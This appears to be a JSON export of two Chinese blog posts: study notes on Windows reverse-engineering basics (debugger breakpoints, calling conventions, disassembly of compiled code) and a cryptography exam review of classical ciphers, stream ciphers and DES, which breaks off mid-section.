[{"title":"加密与解密","url":"/2021/01/02/加密与解密/","content":"\n# 0x01 basic knowledge\n\n## what？\n\n### 1.1 逆向分析技术\n\n1. 通过软件使用说明和操作格式\n2. 静态分析\n3. 动态分析\n   - 粗跟踪：大块跟踪，遇到 CALL、REP、LOOP等一般不跟入。了解Win32 API 根据情况合适选择断点。\n   - 细跟踪关键部分：粗跟踪获取核心模块和程序段，再进行具体跟踪。\n\n## 1.2 文本字符\n\n### 1.2.1 ASCII 与 Unicode\n\n​\tAscii 是7位编码标准，00h~7Fh，26个小写字母和26个大写字母、10个数字、32个符号、33个控制代码及空格，共128个代码。厂商扩充128附加字符，但其中部分不统一。如 ANSI、Symbol、OEM 等字符集，**ANSI 是系统预设的标准文字存储格式。**\n\n​\tUnicode 是 ASCII 字符编码扩展，在 win 中用两Byte进行编码，称为宽字符集widechars。Unicode 是双字节编码机制的字符集，0~65535 双字节无符号整数对每个字符进行编码。Unicode 所有字符都是16位，7位的 ASCII 码被扩充为16位。\n\n```\n#ascii\n70h 65h 64h\n#Unicode\n0070h 0065h 0064h\n```\n\n​\tIntel 处理器在内存中将一个字存入存储器要占用相继的2字节，按 Little-endian （低字节）方式存入，高位字节存入高地址。\n\n[![rq6Mw9.png](https://s3.ax1x.com/2020/12/30/rq6Mw9.png)](https://imgchr.com/i/rq6Mw9)\n\n### 1.2.2 字节存储顺序\n\n- Big-endian：高位字节存入低地址，低地址存入高地址。\n- Little-endian：低位字节存入低地址，高位地址存入高地址。\n\n例如：12345678h 写入以 1000h 开始的内存中\n\n[![rq6dwd.png](https://s3.ax1x.com/2020/12/30/rq6dwd.png)](https://imgchr.com/i/rq6dwd)\n\n[![rq6BFI.png](https://s3.ax1x.com/2020/12/30/rq6BFI.png)](https://imgchr.com/i/rq6BFI)\n\n一般 x86 系列 CPU 都是 Little-endian 字节序，PowerPC 通常是 Big-endian 字节序。网络协议也采用 Big-endian 方式传输数据，所以称为网络字节序。\n\n## 1.3 Windows\n\n### 1.3.1 API\n\nApplication Programming Interface（应用程序编程接口）。提供窗口管理、图形设备接口、内存管理等服务功能，以函数库形式组织在一起，形成 Windows 应用程序编程接口，Win API。Win API 子系统负责讲 API 调用转换成 Windows 操作系统的系统服务调用。API 下面是 Windows 操作系统核心，上面是 Windows 应用程序。\n\n[![rqfio4.png](https://s3.ax1x.com/2020/12/30/rqfio4.png)](https://imgchr.com/i/rqfio4)\n\n​\t16位 Windows 的 API 称作“Win16”，用于32、64位 Windows 的 API 称作“Win32”，其中64位 API 的名称和基本功能没变，只是用64位代码实现。Win API 是基于 C 语言接口，但可由不同语言编写的程序调用。\n\n​\t32位系统调用 Win16 函数要经过转换层转换位 Win32 函数，反之相同。\n\n​\tWindows 运作核心是 DLL，16位 win 中位于 \\WINDOWS\\SYSTEM；32位 win 中位于 \\SYSTEM 和 \\SYSTEM32 中。早期只需在三个 DLL 中实现 Win 主要部分：\n\n- Kernel（Kernel32.DLL）：操作系统核心功能服务，进程与线程控制、内存管理、文件访问等。\n- User（USER32.DLL）：处理用户接口，包括键鼠输入、串口和菜单管理等。\n- GDI（GDI32.DLL）：图像设备接口，允许程序在屏幕和打印机上显示文本和图形。\n\n---\n\n​\t向 Windows 函数传一个 ANSI 字符串，会先将 ANSI 字符串转换成 Unicode 字符串，再传给操作系统；若希望函数返回 ANSI 字符串，系统会先将 Unicode 字符串转换成 ANSI 字符串，然后再返回程序。\n\n​\tWin32 API 函数字符集中，**A** 表示 ANSI，**W** 表示 Widechars(Unicode)。前者是常使用的单字节方式；后者是宽字节方式，以便处理双字节字符。每个以字符串位参数的 Win32 函数在操作系统中都有这两种方式的版本。\n\n### 1.3.2 WOW64\n\n​\tWindows-on-Windows64-bit 是64位 Windows 上的子系统，可使 32 位应用程序在不修改的情况下运行在64位操作系统上。64位系统文件放在 System32 文件夹中，还增加了 \\Windows\\SysWOW64 文件夹来存储32位系统文件。\n\n​\t加载32位程序时，WOW64 建立32位 ntdll.dll 要求的启动环境，切换 CPU 模式至32位，开始执行32位加载器。**WOW64 会对32位 ntdll.dll 的调用重定向 ntdll.dll(64位)**，而不是发出原生32位系统调用指令。WOW64 转换到原生64位模式，获取系统调用有关参数，发出对应原生64位系统调用。\n\n### 1.3.3 Windows 消息机制\n\n​\tWindows 是一个消息驱动式系统。Windows 消息提供通信手段，应用程序想要实现的功能由消息触发，通过对消息的响应和处理来完成。\n\n- 系统消息队列\n- 应用程序 消息队列\n\n​\t所有输入设备由 Windows 监控。事件发生时，WIndows先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给对应的窗口函数。无论事件急缓，总按先后排队（一些系统消息除外），可能导致外部实时事件得不到及时处理。\n\n### 1.3.4 虚拟内存\n\n​\t32位系统地址空间为 4GB 以内，00000000h~FFFFFFFFh，代码和数据都放在同意地址空间中，不区分代码段和数据段。\n\n​\t虚拟内存 virtual memory 通过映射 map 的方法使可用虚拟地址 virtual address 达到 4GB，每个应用程序都可以获得 2GB 的虚拟地址，剩下 2GB 系统自用。\n\n​\t应用程序不会直接访问物理地址，虚拟内存管理器通过虚拟地址的访问请求来控制所有物理地址访问。每个应用程序都有独立的 4GB 寻址空间，彼此隔离。DLL 程序没有私有空间，总时背映射到其他应用程序地址空间中，作为其他应用程序的一部分运行，DLL 不与其他程序处于同一地址空间，应用程序就无法调用它。\n\n# 0x02 动态分析技术\n\n## 2.1OD 调试器\n\n### 2.1.3 基本操作\n\n[![rOPUpj.png](https://s3.ax1x.com/2020/12/30/rOPUpj.png)](https://imgchr.com/i/rOPUpj)\n\n### 2.1.4 常用断点\n\n#### 1.INT3\n\n​\tbp 命令或者 F2 快捷键来设置/取消断点。执行 INT3 断点，该地址内容被 INT3 指令替换。INT3 指令机器码是 0xCC，被调试进程执行 INT3 指令导致一个异常时，调试器会捕捉到这个异常，从而停在断点处，然后将断点处指令恢复原来指令。\n\n​\t优点是可以设置无数个断点，缺点是改变原程序机器码，易被软件检测。为防范 API 被下断点，一些软件会检测 API 首地址是否为 0xCC。将断点设在函数内部或末尾可绕过该检测方法。\n\n```c\nFARPROC Uaddr;\nBYTE Mark= = 0;\n(FARPROC&) Uaddr = GetProAddress(LoadLibrary(\"user32.dll\"),\"MessageBox\");\nMark = *((BYTE*)Uaddr);\nif(Mark == 0xCC)\n    return true;\n```\n\n#### 2.硬件断点\n\n与 DRx 调试寄存器有关。\n\n[![sCoQUg.png](https://s3.ax1x.com/2021/01/04/sCoQUg.png)](https://imgchr.com/i/sCoQUg)\n\n- DR0~DR3：调试地址寄存器，用于保存需要监视的地址，如设置硬件断点。\n- DR4~DR5：保留\n- DR6：调试寄存器组状态寄存器。\n- DR7：调试寄存器组控制寄存器。\n\n​\t硬件断点原理是使用 DR0~DR3 设定地址，并使用 DR7 设定状态，最多设置 4 个断点。硬件执行断点与  CC 断点作用一样，但不会修改指令首字节，更难检测，速度更快。\n\n#### 3. 内存断点\n\n​\t原理是对所设的地址赋予不可访问/不可写属性，当访问/写入的时候就会产生异常。OD 截获异常后，比较是不是断点地址，是就中断。考虑执行效率，只能下一个内存断点。在内存也可对代码右键下内存断点。\n\n#### 4. 内存访问一次性断点\n\n​\talt+m 显示内存，set break-on-access（访问上设置断点） 用于对整个内存块设置该类断点，该断点是一次性的，当所在段被读取或执行时就会中断。向捕捉调用或返回某个模块（如脱壳）就显得很有用。\n\n#### 5. 消息断点\n\n​\t当某个特定窗口函数接收到特定消息时，消息断点将程序中断。只有在窗口被船舰之后才能被设置并拦截消息。\n\n​\t用户在窗口的操作，消息会发送给当前窗体。所有发送的消息有4个参数，包括1个窗口句柄 hwnd，一个消息编号 msg 和2个 long 的参数。win 可通过句柄来标识它代表的对象。\n\n​\t查看 od 中的 windows 窗口，列出相关参数，可右键选中执行 Message breakpoint on ClassProc，再根据消息类型设置拦截的消息。之后回到进程界面进行对应操作会中断在 Windows 系统代码中，此时可在 .text 段下内存断点可回到应用程序代码。\n\n#### 6. 条件断点\n\n​\t满足一定条件才会中断称为条件断点，可按寄存器、存储器、消息等设断点。调试器遇到此类断点时，计算表达式的值，结果非零或者表达式有效，则中断。\n\n- 按寄存器条件中断：快捷键 shift+F2，输入 eax==04000000 或 bp addr eax==04000000\n- 按存储器条件中断：根据对应地址存储的对应内容来判断中断，如 bp CreateFileA,[STRING [esp+4]]==\"c:\\\\1212.txt\"\n\n#### 7. 条件记录断点\n\n​\t除了条件断点作用，还能记录断点处函数表达式或参数的值，也可设置通过断点的次数，每次负荷中断条件，计数器值减一。shift+F4 打开条件记录，可设置条件\n\n[![siQIwd.png](https://s3.ax1x.com/2021/01/04/siQIwd.png)](https://imgchr.com/i/siQIwd)\n\n[![sil2As.png](https://s3.ax1x.com/2021/01/04/sil2As.png)](https://imgchr.com/i/sil2As)\n\n### 2.1.5 插件\n\n![image-20210104192741409](C:\\Users\\leehung\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210104192741409.png)\n\n### 2.1.8 调试符号\n\n​\t被调试程序二进制信息与源程序信息之间的桥梁，在编译器将源文件编译为可执行程序过程中为支持调试而摘录的调试信息，包括变量、类型、函数名、源代码行等。\n\n# 0x03 静态调试\n\n## IDA\n\n#### 3.3.16 IDC 脚本\n\n​\t在IDA中按下 shift + F2 可调出脚本编辑器，可以简单的学习一下IDA IDC脚本的编写与使用，IDC脚本借鉴的C语言的语法，具体参考 [IDA 中的IDC脚本编写笔记](https://www.cnblogs.com/LyShark/p/13100048.html)\n\n# 0x04 逆向分析技术\n\n## 4.1 32位软件逆向\n\n### 4.1.1 启动函数 \n\n​\t编写 Win32 应用必须在源码实现一个 WinMain 函数。但并不是从 WInMain 函数开始执行，首先被执行的是启动函数的相关代码，这段由编译器生成。启动代码初始化进程完成后，才会调用 WinMain 函数。\n\n​\tC/C++ 程序运行时，启动函数作用基本相同，包括检索指向新进程的命令行指针、检索指向新进程的环境变量指针、全局变量初始化和内存栈初始化等。\n\n### 4.1.2 函数\n\n#### 1. 函数的识别\n\n​\t编译器使用 call 和 ret 指令来调用函数及返回调用位置。call 指令给出被调用函数的起始地址：ret 指令用于结束函数的执行。可通过两者来识别函数。\n\n#### 2. 函数的参数\n\n​\t栈方式、寄存器方式、全局变量进行隐含参数传递的方式。\n\n**栈传递参数**\n\n​\tesp 指向栈中第一个可用数据项，调用函数时，参数依次入栈，再调用函数。调用后，再栈中取得数据并计算。计算结束后，由调用者或者被调用者平衡栈数据。\n\n[![sZvQhQ.png](https://s3.ax1x.com/2021/01/07/sZvQhQ.png)](https://imgchr.com/i/sZvQhQ)\n\n详情可见 [常见函数调用约定](https://bbs.pediy.com/thread-224583.htm)。\n\n​\t函数对参数的存取及局部变量都是通过栈来定义的，非优化编译器用一个专门的寄存器（通常是 ebp）对参数进行寻址。\n\n- 调用者将函数执行完毕时返回的地址、参数入栈。\n- 子程序使用 “ebp指针+偏移量” 对栈中的参数进行寻址并取出，完成操作。\n- 子程序使用 ret 或 retf 指令返回。CPU 将 eip 置为栈中保存的返回地址，并继续执行他。\n\nstdcall 约定 test2(Par1, Par2)，汇编代码大致如下：\n\n```asm\npush par2\npush par1\ncall test2\n{\n\tpush ebp\n\tmov ebp, esp\n\tmov eax, dword ptr [ebp+0C]\n\tmov ebx, dword ptr [ebp+08]\n\tsub esp, 8\t\t\t\t\t;为局部变量留出空间\n\t...\n\tadd esp, 8\t\t\t\t\t;释放局部变量空间\n\tpop ebp\n\tret 8\t\t\t\t\t\t;值为参数个数×4\n}\n```\n\n[![seDefA.png](https://s3.ax1x.com/2021/01/07/seDefA.png)](https://imgchr.com/i/seDefA)\n\nenter 指令相当于 push ebp; mov ebp, esp\n\nleave 指令相当于 add esp, xxx; pop edp\n\n**寄存器传递参数**\n\n​\t如 Fastcall，VC++ 中，左边两个不大于4字节的参数分别放在 ecx 和 edx 中，之后的参数从右往左压栈，由被调用函数清理栈。\n\n​\tThiscall 是 C++ 中非静态成员函数的默认调用对象，对象的每个函数隐含接收 this 参数。参数从右往左顺序入栈，由被调用函数清理栈，仅通过 ecx 传递 this 指针。\n\n```c++\nclass Csum\n{\n\tpublic:\n\tint Add(int a, int b)\t//Add(this, int a, int b)\n\t{\n\t\treturn (a+b);\n\t}\n};\nvoid main()\n{\n\tCSum sum;\n\tsum.Add(1, 2);\n}\n```\n\n对应汇编代码为\n\n```asm\npush ebp\nmov ebp, esp\npush ecx\npush 00000002\npush 00000001\nlea ecx, [ebp-04]\t\t;this 指针通过 ecx 寄存器传递\ncall xxxxxx\nmov esp, ebp\npop ebp\nret\n\n;sum.Add()\npush ebp\nmov ebp, esp\npush ecx\nmov [ebp-04], ecx\nmov eax, [ebp+08]\nadd eax, [ebp+0C]\nmov esp, ebp\npop ebp\nret 0008\n```\n\n**名称修饰约定**\n\n​\t为了允许使用操作符和函数重载，编译器会改写每一个入口点的符号名，从而允许同一个名字有多个用法且不会破坏现有基于 C 的链接器。\n\n#### 3. 函数返回值\n\n**return**\n\n​\t一般函数返回值放在 eax 寄存器中返回，处理结果大小超过 eax 寄存器容量，其高32位就会放到 edx 寄存器中。\n\n**参数按传引用方式返回值**\n\n​\t传值调用会建立参数一份副本，在调用函数中修改参数值复本不会影响原始变量值。传引用调用允许调用函数修改原始变量的值。调用某个函数，当吧变量地址传递给函数时，可以在函数中用间接引用运算符修改调用函数内存的单元中该变量的值。\n\n### 4.1.3 数据结构\n\n#### 1.局部变量\n\n**用栈存放**\n\n​\t用 `sub esp, 8` 语句位局部变量分配空间，用`ebp-xxxx`寻址调用这些变量，而参数调用相对于 ebp 偏移量是正的`ebp+xxxx`，在逆向时比较容易区分。编译器优化模式时，通过 esp 寄存器直接对局部变量和参数进行寻址。用`add esp, 8`来平衡栈，释放局部变量内存。\n\n[![sm41Zd.png](https://s3.ax1x.com/2021/01/07/sm41Zd.png)](https://imgchr.com/i/sm41Zd)\n\n​\t在被调用函数中，不存在 `sub esp, n`，而是通过 `push ecx` 来开辟一块栈，然后`[esp-04]`来访问这个局部变量。局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据，因此需要对其进行初始化：一是 mov 位变量赋值，二是 push 直接压栈。\n\n**寄存器**\n\n​\t除了栈占用两个寄存器，剩下6个寄存器尽可能有效存放局部变量，可以少产生代码，提高效率。寄存器不够用就会放到栈中。\n\n#### 2. 全局变量\n\n​\t一直存放在全局变量的内存区中。通常位于数据区块 .data 一个固定地址处，一般用一个**固定硬编码地址**直接对内存进行寻址。编译器一般会将全局变量放到可读写的区块里（若只可读，则就是一个常量）。在程序整个执行过程中占用内存单元。\n\n```asm\nmov eax, dword ptr [4084C0h] ;4084C0h是全局变量地址\n```\n\n​\t全局变量可被同一文件中所有函数修改，若某个函数改变了全局变量的值，就能影响到其他函数。\n\n#### 3. 数组\n\n​\t相同数据类型元素的集合，在内存中按顺序连续存放在一起，一般通过基址加变址来寻址访问。\n\n### 4.14 虚函数\n\n​\t虚函数地址只能在调用即将进行时确定，所有对虚函数 的引用通常放在虚函数表 VTBL 中，数组的每个元素中存放的就是类中虚函数的地址。调用时，先取出虚函数表指针 VPTR，得到虚函数表地址，根据这个地址到虚函数表中取出该函数地址，最后调用该函数。\n\n[![sQPuIH.png](https://s3.ax1x.com/2021/01/09/sQPuIH.png)](https://imgchr.com/i/sQPuIH)\n\n```c++\nclass CSum\n{\n    public:\n    \tvirtual int Add(int a, int b)\n            return (a+b);\n    \tvirtual int Sub(int a, int b)\n            return (a-b);\n};\nvoid main()\n{\n    CSum* pCSum = new CSum;\n    pCSum->Add(1,2);\n    pCSUm->Sub(1,2);\n}\n```\n\nVC++6.0，maximize Speed下，汇编为：\n\n```asm\n00401000: push esi\npush 4\t\ncall 00401060\t\t;new()，分配4字节内存\nadd esp, 4\t\t\t;清理栈\ntest eax, eax\t\t;查询是否分配成功\nje short 00401019\nmov dword ptr [eax], 4050A0\t;该值为CSum类虚函数表指针 VPTR\nmov esi, eax\t\t\t\t;esi=VTBL\njmp short 0040101B\n00401019: xor esi, esi\nmov eax, dword ptr [esi]\t;eax=*VTBL=**Add()\npush 2\npush 1\nmov ecx, esi\t\t\t;this 指针\ncall dword ptr [eax]\t;调用eax的值为地址里的函数Add\nmov edx, dword ptr [esi]\npush 2\npush 1\nmov ecx, esi\ncall dword ptr [edx+4]\t;Sub\npop esi\nretn\n```\n\n​\t调用 new 函数分配 class 所需的内存。调用成功后，eax 保存分配到内存的指针，然后将对象实例指向 CSum 类虚函数表 VTBL 004050A0h。\n\n[![sQB7T0.png](https://s3.ax1x.com/2021/01/09/sQB7T0.png)](https://imgchr.com/i/sQB7T0)\n\n```asm\n[VTBL]=401040h\t ;Add()\n[VTBL+4]=401050h ;Sub()\n```\n\n### 4.1.5 控制语句\n\n#### 1. if-then-else\n\n​\t整数用 cmp 指令进行比较，浮点值用 fcom、fcmp 等比较。通常为\n\n```asm\ncmp a, b\t\t;影响几个标志位：零标志位、进位标志、符号标志位、溢出标志位\njz(jnz) xxxx\n```\n\n​\t实际上，编译器使用 test、or 或 dex 这种较短逻辑指令替换 cmp。\n\n```c++\n#include<iostream>\nint main()\n{\n    int a, b=5;\n    scanf(\"%d\", &a);\n    if(a==0)\n        a=8;\n    return a+b;\n}\n```\n\nVC++6.0，maximize Speed下，汇编为：\n\n```asm\npush ecx\t\t\t\t\t;等价于 sub esp, 4\nlea eax, dword ptr [esp]\t;eax 指向局部变量空间\npush eax\t\t\t\t\t\npush 00407030\t\t\t\t;\"%d\"\ncall 00401030\t\t\t\t;scanf函数\nmov eax, dword ptr [esp+8]\t;取scanf结果到 eax\nadd esp, 00000008\t\t\t;_cdecl 调用，调用者平衡栈\ntest eax, eax\t\t\t\t\njne 00401020\t\t\t\t;ZF=0 则跳转\nmov eax, 00000008\n00401020:add eax, 00000005\npop ecx\t\t\t\t\t\t;释放局部变量内存\nret\n```\n\n#### 2. SWITCH-CASE\n\n​\t多个 IF-THEN 语句的嵌套组合\n\n#### 3. 转移指令机器码计算\n\n- Short Jump：无条件转移和条件转移机器码均为 2 字节，转移范围是 -128~127 字节。\n- Long Jump：无条件转移机器码为 5 字节，条件转移码为 6 字节（条件转移：2字节标识转移类型；其他4字节表示转移偏移量；无条件转移：1字节 jmp，4字节偏移量）。\n- call：一类调用类似于 Long Jump；另一类调用参数涉及寄存器、栈等，如`call dword ptr [eax+2]`\n\n[![slDjYV.png](https://s3.ax1x.com/2021/01/10/slDjYV.png)](https://imgchr.com/i/slDjYV)\n\n**短转移指令机器码计算**\n\n```asm\n4010000: jmp 401005\n.....\n401005: xor eax, eax\n```\n\n​\tCPU 执行完 jmp 401005，后 eip = 4010002h，执行 eip=eip+偏移量，就跳转 401005 处。所以 jmp 401005 机器码为 `EB 03`。\n\n**长转移指令机器码计算**\n\n```asm\n4010000: jmp 401005\n.....\n402398: xor eax, eax\n```\n\n位移量为 00402398h - 00401000h - 5h(长转移指令机器码长度) = 00001393h\n\n所以机器码为 `E9 93 13 00 00`\n\n\n\n若向前转移的无条件指令\n\n```asm\n4010000: xor eax, eax\n.....\n402398: jmp 401000\n```\n\n位移量为 401000h - 402398h - 5h = FFFFEC63h(取后32位)\n\n机器码为 `E9 63 EC FF FF`\n\n#### 4. 条件设置指令 SETcc\n\n​\t指令形式是 `SETcc r/m8`，r/m8 表示表示8位寄存器或单字节内存单元。\n\n[![slfm11.png](https://s3.ax1x.com/2021/01/10/slfm11.png)](https://imgchr.com/i/slfm11)\n\n```c\nc = (a < b)? c1, c2;\n```\n\n使用条件设置指令，编译器不产生包含条件分支的逻辑判断代码\n\n```asm\nxor eax, eax\ncmp a, b\nsetge al\ndec eax\nand eax, (c1-c2)\nadd eax, c2\n```\n\n#### 5. 纯算法实现逻辑判断\n\n### 4.1.6 循环语句\n\n​\t高级语言中进行反向引用的一种语言形式。确定某段代码是循环代码，就可分析其计数器，一般位 ecx 。\n\n---\n\n2021.1.10 先8学这本了"},{"title":"密码学复习","url":"/2020/01/02/密码学复习/","content":"\n## 第一章：密码体制\n\n密码体质的设计原则：密码系统的安全性不应该取决于不易改变的算法，应该取决于可随时改变的密钥\n\n五元组：M（明文）、C（密文）、K（密钥）、E（加密算法）、D（解密算法）\n\n### 密码体制分类\n\n- 🌟对称密码\n  - 序列密码（流密码）：RC4、A5等\n  - 分组密码：DES、3DES、AES、IDEA\n- 🌟公钥密码：RSA、ECC、Rabin、Elgamal\n\n对称密码体制优点：\n\n- 速度快\n- 密钥较短\n- 密文往往与明文长度相同\n\n对称密码体制缺点\n\n- 密钥分发需要安全通道\n- 密钥量大，难管理\n- 难于解决不可否认问题\n\n公钥密码体制优点：\n\n- 密钥分发相对简易\n- 密钥简单管理\n- 可以实现数字签名\n\n公钥密码体制缺点：\n\n- 加解密速度慢\n- 密钥较长\n- 密文长度往往大于明文长度\n\n### 密码分析\n\n被动攻击与主动攻击：\n\n- 被冻攻击：对一个保密系统采用截获密文进行分析，如监视、偷听等\n- 主动攻击：非法入侵者主动干扰系统，采用删除、更改、增添、重放等方法向系统加入假消息\n\n破译和攻击密码的主要方法：\n\n- 穷举攻击法（爆破）\n  - 变体：字典攻击\n- 统计分析法：根据明文、密文和密钥的统计规律来破译密码\n  - 适用于对称密码体制\n- 数学分析攻击法：针对加解密算法的数学基础和某些密码学特征，通过数学求解的方法来破译密码\n  - 适用于公钥密码体制\n\n#### 🌟根据密码分析者对明文、密文等数据资源的掌握程度，可以将密码分析攻击分为以下几种\n\n- 唯密文攻击（被动）：仅能根据截获的密文进行分析，以得出明文或密钥（如穷举和统计分析）\n- 已知明文攻击（被动）：除了有截获的密文外，还知道一些已知的“**明文-密文对**”，来破译密码\n- 选择明文攻击（主动）：除得到一些”明文-密文对”外，还可以**选择被加密的明文，并获得相应的密文**\n  - 目标：推出用来加密的密钥或者某种算法\n  - 变体：自适应选择明文攻击\n- 选择密文攻击（主动）：可以**选择一些密文，并得到相应的明文**\n  - 目标是推出密钥\n  - 多用于攻击公钥密码体制\n  - 变体：自适应选择密文攻击\n\n攻击的复杂性取决于\n\n- 数据复杂性：攻击所需要的输入数据量\n- 处理复杂性：完成攻击所需要花费的时间\n- 存储需求：所需要的数据存储空间大小\n\n**攻击的复杂性取决于以上三个因素的最小复杂度**\n\n安全的密码体制特性\n\n- **密文恢复明文**是困难的，即使知道明文空间\n- 从密文获得明文**部分信息**是困难的\n- 从密文**探测出简单有用的事实**也是困难的\n\n评价密码体制安全性的途径：\n\n- 无条件安全性（理论安全性）：分析者有无限计算能力，密码体制也不能被攻破，那么就是无条件安全\n- 计算安全性：攻破一个密码体制最好算法用现在或将来可得到的资源都不能在足够长的时间内破译，该密码体制被认为计算上安全\n- 可证明安全性：可证明安全性只是说明密码体制的安全性与一个问题相关，也成归约安全性\n\n\n\n\n\n## 第二章：古典密码\n\n### 经典密码体制分类：\n\n- 替换密码/代换密码\n  - 单表替换密码：用一个符号代替另外一个符号，一一对应\n    - 🌟移位代换密码：E<sub>k</sub>(i) ＝ i＋k(mod q) ＝ j    \tD<sub>k</sub>(j) ＝ j－k (mod q)＝i \n      - 凯撒密码\n    - 乘数密码：E<sub>k</sub>(i) ＝i ∗ k mod q＝j    D<sub>k</sub>(j)＝j ∗ k^(-1)   mod q＝i    \n    - 🌟仿射密码：以上两个的组合 C＝ k<sub>1</sub>∗m＋k<sub>2</sub> mod 26    m＝ (C-k<sub>2</sub>)∗k<sub>1</sub><sup>-1</sup> mod 26\n  - 多表替换面：多个替换包\n- 置换密码/换位密码：对符号重新排序\n\n#### 🌟Playfair密码\n\n思路：双字母转换\n\n密钥：5×5矩阵\n\n- 比如关键词为 FIVESTARS，将关键词中**重复字母去掉**，填充矩阵起始部分，之后将26字母中未出现的字母按顺序填充\n- I 和 J 作为一个字母看待\n- 密钥空间为 25\n\n对每一对明文m1, m2加密如下：\n\n- 若m1和m2**同行**，则密文c1和c2分别紧靠m1，m2**右端**的字母，其中第一列看做最后一列的右方\n- 若m1和m2**同列**，则密文c1和c2分别是紧靠m1，m2**下方**的字母，其中第一行看做最后一行的下方\n- 若m1和m2**不同行也不同列**，则c1和c2是m1，m2确定的**矩形的其他两角**的字母，并c1和m1，c2和m2同行\n- 若出现重复字母，即m1=m2，则在其中插入字母Q\n- 如明文字母是单数，将Q放在明文的末端\n\n![lALtgg.png](https://s2.ax1x.com/2019/12/26/lALtgg.png)\n\n![lALRKJ.png](https://s2.ax1x.com/2019/12/26/lALRKJ.png)\n\n#### 🌟维吉尼亚密码\n\n维吉尼亚方阵为 26×26表，加密过程：先找**明文的列**，再找**密钥的行**\n\n![img](https://img-blog.csdn.net/20150506223204325)\n\n![lAjE40.png](https://s2.ax1x.com/2019/12/26/lAjE40.png)\n\n安全性能分析步骤：\n\n- 确定密钥长度d\n  - Kasiski测试法\n  - 重合指数法\n- 确定具体的密钥字\n  - 重合互指法\n\n\n\n## 第三章：序列密码\n\n基本概念：用一个随机序列（密钥流）与明文序列按位叠加产生密文；用同一随机序列与密文序列叠加来恢复明文。\n\n![lESRWq.png](https://s2.ax1x.com/2019/12/26/lESRWq.png)\n\n种子密钥通过密钥流发生器得到的密钥流\n\n![lEpPkd.png](https://s2.ax1x.com/2019/12/26/lEpPkd.png)\n\n特点：\n\n- 加解密只是简单的模二加法运算（异或）\n- 密码安全强度依赖密钥流的安全性\n\n序列密码分类：\n\n- 同步序列密码：密钥序列的产生独立于明文消息和密文消息\n  - 无错误传输：一个错误只影响一个符号\n  - 同步：保持精确，且密钥作用位置相同才能正确解密\n- 🌟自同步序列密码：密钥序列是密钥及固定大学的以为密文的函数（密钥由以往密钥及密文生成）\n  - 有限错误传播\n  - 自同步\n  - 消除明文统计特征\n\n密钥流生成器大都基于**移位寄存器FSR**\n\n- 基于移位寄存器的密钥流序列成为**移位寄存器序列**\n- 通常由**线性移位寄存器LFSR**和一个**非线性组合函数（布尔函数）**组成一个密钥流发生器\n\n![lE9bxx.png](https://s2.ax1x.com/2019/12/26/lE9bxx.png)\n\n### 🌟线性反馈移位寄存器\n\n特点：\n\n- 非常适合硬件实现\n- 能产生大的周期序列\n- 能产生统计性好的序列\n- 能够应用代数方法分析\n\n![lECAL8.png](https://s2.ax1x.com/2019/12/26/lECAL8.png)\n\n定理：n级LFSR产生的序列有最大周期 2<sup>n</sup>-1的必要条件是**其特征多项式为不可约的**\n\n### 🌟m-序列密码的破译\n\nm-序列（周期为 2<sup>n</sup>-1）如果攻击者知道了 **2n位明密文对** ，则可确定反馈多项式的系数，从而确定LFSR接下来状态，得到余下的密钥序列\n\n![lEPbDK.png](https://s2.ax1x.com/2019/12/26/lEPbDK.png)\n\n![lEPOED.png](https://s2.ax1x.com/2019/12/26/lEPOED.png)\n\n![lEPxCd.png](https://s2.ax1x.com/2019/12/26/lEPxCd.png)\n\n\n\n伪随机性测试\n\n- 扑克牌测试\n- 游程测试\n- 接收20000个二进制位，检验1和0的核数是否大致相等\n\n常见基于LFSR的密钥序列发生器\n\n- Geffefasq\n- 钟控发生器\n- 交错停走式发生器\n- 门限发生器\n\n\n\n## 第四章：分组密码\n\n特点：速度快、安全性较高、易于标准化、便于软硬件实现\n\n分组密码设计要求：\n\n- 分组长度足够大\n- 密钥量足够大\n- 密码变换够复杂\n- 加密和解密运算简单\n- 无数据扩展和压缩\n\n设计思想：扩散和混淆，目的抵抗对密码系统的统计分析\n\n- 扩散：密钥或明文每一比特变化影响密文许多比特变化（雪崩效应）\n- 混淆：密钥和明文及密文之前依赖关系尽可能复杂，防止统计分析法\n\n## 🌟数据加密标准DES\n\n> 算法详解在课程设计中已详细展开，不再累述，这里主要讲述关于考试方面的主要内容\n\n明文分组和密文均为 **64bit** ，有效密钥为 **56bit**（另外8比特用于奇偶校验，用于检查密钥 K 在产生和分配及存储过程中可能发生的错误）。由初始置换、16轮迭代、逆初始置换组成\n\n- 初始置换和逆初始置换：通过置换表置换，没有安全意义，可忽视\n\n- 16轮迭代：每轮迭代，64位的中间结果分为左右两部分，且作为独立32位数据进行处理。每轮迭代的输入时上轮的结果 L<sub>i-1</sub> 和 R<sub>i-1</sub>。\n\n  ![lYOmGt.png](https://s2.ax1x.com/2020/01/02/lYOmGt.png)\n\n **加解密过程：**\n\n![lZeMlD.png](https://s2.ax1x.com/2019/12/27/lZeMlD.png)\n\n#### 加密函数F\n\n![lZefcF.png](https://s2.ax1x.com/2019/12/27/lZefcF.png)\n\n- E扩展置换：32bit 扩展为 48bit，每输入分组的4位作为6位输出分组的中间4位，第1位和第6位分别由相邻两个4位分组的最外面两位扩散进入本分组\n- 与子密钥异或：将48位输出与子密钥 K<sub>i</sub> 进行异或操作\n- 🌟**压缩替换 S-盒**：\n  - 由8个S-盒构成，每个S-盒都是6比特输入，4比特输出\n  - s<sub>i</sub> (h<sub>1</sub>h<sub>2</sub>h<sub>3</sub>h<sub>4</sub>h<sub>5</sub>h<sub>6</sub>) 的值是对应表 s<sub>i</sub> 中 (h<sub>1</sub>h<sub>6</sub>) 行和 (h<sub>2</sub>h<sub>3</sub>h<sub>4</sub>h<sub>5</sub>) 列上的值\n\n![lZmlCV.png](https://s2.ax1x.com/2019/12/27/lZmlCV.png)\n\n- S-盒设计准则：\n  - 有良好的非线性性（输出的每个比特与全部输入比特相关）\n  - 每一行包括所有16种4位二进制\n  - 两个输入相差1比特时，输出相差2比特等\n- P-置换：P-置换对8个S-盒的输出进行变换（对表查询变换）\n\n### 🌟DES轮运算对和性证明\n\n- 定义 T 是把64位数据的左右两半交换位置\n\n$$\nT(L,R)=(R,L)\n$$\n\n​\t\t因为\n$$\nT^2(L,R)=(L,R)=I\n$$\n​\t\t其中 I 为恒等变化，于是\n$$\nT = T^{-1}\n$$\n​\t\t所以 T 变化是对合运算\n\n- 记 DES 第 i 